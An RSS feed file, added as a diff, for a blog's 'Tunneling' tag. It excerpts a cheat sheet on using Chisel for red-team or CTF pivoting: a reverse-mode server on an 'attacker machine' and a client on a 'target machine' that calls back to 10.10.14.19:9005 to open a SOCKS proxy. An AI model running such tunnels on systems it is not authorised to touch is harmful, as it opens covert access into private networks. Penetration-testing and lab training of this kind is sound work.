@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Tunneling on Gajendra Mahato</title>
+    <link>http://localhost:1313/tags/tunneling/</link>
+    <description>Recent content in Tunneling on Gajendra Mahato</description>
+    <generator>Hugo -- 0.155.3</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 13 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/tunneling/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>🛠️ Chisel Port Forwarding Guide</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-what-is-chisel&#34;&gt;🧠 What is Chisel?&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Chisel&lt;/strong&gt; is a fast TCP/UDP tunnel over HTTP, useful for &lt;strong&gt;port forwarding&lt;/strong&gt; and &lt;strong&gt;pivoting&lt;/strong&gt;, especially during red teaming or CTFs.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-attacker-machine-setup-chisel-server&#34;&gt;🔥 Attacker Machine Setup (Chisel Server)&lt;/h2&gt;
+&lt;p&gt;Start Chisel in &lt;strong&gt;reverse mode&lt;/strong&gt; on the attacker machine:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./chisel_1.5.1 server -p &lt;span class=&#34;m&#34;&gt;9005&lt;/span&gt; --reverse
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-p 9005&lt;/code&gt;: Listen on port 9005&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--reverse&lt;/code&gt;: Accept reverse port forwarding connections&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;-target-machine-setup-chisel-client&#34;&gt;🎯 Target Machine Setup (Chisel Client)&lt;/h2&gt;
+&lt;h3 id=&#34;forward-all-traffic-to-attacker&#34;&gt;Forward all traffic to attacker:&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./chisel client 10.10.14.19:9005 R:socks
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;This sets up a &lt;strong&gt;SOCKS proxy&lt;/strong&gt; from the target to the attacker&amp;rsquo;s Chisel server&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
